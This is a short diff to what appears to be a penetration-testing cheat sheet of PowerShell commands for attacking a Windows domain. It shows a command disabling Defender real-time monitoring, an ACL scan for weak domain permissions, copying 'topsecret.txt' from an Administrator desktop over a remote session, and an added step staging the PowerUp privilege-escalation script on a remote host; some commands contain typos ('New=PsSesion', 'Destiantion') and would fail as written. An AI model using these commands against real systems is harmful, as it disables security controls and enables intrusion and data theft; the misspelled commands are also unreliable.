@@ -708,12 +708,15 @@ Set-MpPreference -DisableRealtimeMonitoring $true
 
 # Looking for weak ACL in domain
 ```
-Invoke-ACLScanner | Where-Object {$_.IdentityReference –eq $userName
+Invoke-ACLScanner | Where-Object {$_.IdentityReference –eq $userName}
 ```
 # File Transfer
 ```
 $ses = New=PsSesion -ComputerName HYDRA
 Copy-Item -FromSession $ses -Path  C:\Users\Administrator\Desktop\topsecret.txt
+
+$ses = New=PsSesion -ComputerName HYDRA
+Copy-Item -ToSession $ses -Path  C:\Users\punisher\Desktop\powerup.ps1 -Destiantion C:\Users\Random\powerup.ps1
 ```
 # Other
 Extract RDP, Putty sessions form Registry:
